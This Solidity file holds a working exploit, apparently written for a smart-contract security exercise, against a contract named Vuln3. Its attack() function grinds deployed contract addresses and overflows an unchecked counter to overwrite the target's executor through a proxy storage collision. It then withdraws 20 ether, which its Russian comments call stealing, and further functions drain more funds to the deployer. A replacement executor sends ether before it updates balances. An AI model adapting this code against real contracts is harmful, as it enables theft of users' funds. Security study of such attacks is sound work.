// SPDX-License-Identifier: UNLICENSED

pragma solidity >=0.8;


import "hardhat/console.sol";

import "./Vuln3.sol";


contract HackerExecutor {

    address private owner;

    mapping (address => uint) private balances;

    uint private errorAmount;

    event DepositEvent (address, uint);
    event WithdrawEvent (address, uint);

    constructor () {
        
    }

    modifier OnlyOwner () {
        require(msg.sender == owner, "OnlyOwner");
        _;
    }

    function balanceOf (address addr) public view returns (uint){
        console.log ("balanceOf %s %s %d\n", msg.sender, addr, balances[addr]);
        return balances[addr];
    }

    function deposit (uint amount) public payable {
        console.log ("deposit0 %s %d %d %d\n", msg.sender, amount, balances[msg.sender]);
        balances[msg.sender] += msg.value;
       
        if (amount > msg.value) {
            unchecked {
                errorAmount += amount - msg.value;
            }
        }
        
        emit DepositEvent (msg.sender, msg.value);
        console.log ("deposit1 %s %d %d %d\n", msg.sender, amount, balances[msg.sender]);
    }

    function withdraw (uint amount) public {
        console.log ("hacker withdraw %s %d %d\n", msg.sender, amount, balances[msg.sender]);
        
        msg.sender.call{value: amount} ("");
        if(balances[msg.sender]>=amount){
            balances[msg.sender] -= amount;
        }
        

        emit WithdrawEvent (msg.sender, amount);
        console.log ("withdraw %s %d %d\n", msg.sender, amount, balances[msg.sender]);
    }
    
}


contract Exploit3 {

    address private owner;
    Vuln3 public vulnerableContract;
    HackerExecutor public exContract;

    constructor () payable {

        // запоминаем кто задеплоил эксплоит
        owner = msg.sender;
    }

    
    receive() external payable {
       
    }

    
    modifier OnlyOwner () {
        require(msg.sender == owner, "OnlyOwner");
        _;
    }

    // Сюда нужно передать адрес нужного контракта Vuln3.
    function InitExploit3 (address addr) public payable OnlyOwner {
        vulnerableContract = Vuln3(addr);
        exContract = new HackerExecutor();
        
    }
    
    
    //переполнение глобальной errorAmount
    //Значение ErrorAmount - executor
    // Storage collision between Proxy and Implementation contracts 
    //блокировка средств
    function attack() public payable {
        
        uint originalExecutor  = uint(uint160(vulnerableContract.GetExecutor()));
        uint hackExecutor = uint(uint160(address(exContract)));
        while(hackExecutor<originalExecutor){
            exContract = new HackerExecutor();
            hackExecutor =  uint(uint160(address(exContract)));
        }
        
        uint SubExecutor = hackExecutor - originalExecutor;
        vulnerableContract.deposit{value: 0 ether}(SubExecutor);// задаём новый адрес executor
        vulnerableContract.withdraw(20 ether); //воруем 20 эфира

        
        //vulnerableContract.deposit{value: 22 ether}(1);
        //vulnerableContract.deposit{value: 20 ether}(2**256-1); //после такого переполнения депозит уже не забрать?
        //даже с другим контрактом
      
        
    }

   

    function setDep() public payable{
        vulnerableContract.deposit{value: 5 ether}(0);
    }

    function getDep() public payable{
        vulnerableContract.withdraw(5 ether); //при желании воруем ещё эфира
    }
    

    function getEther() public {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

     function GetExecutor ()  public view returns (address) {
        return address(exContract);
    }
}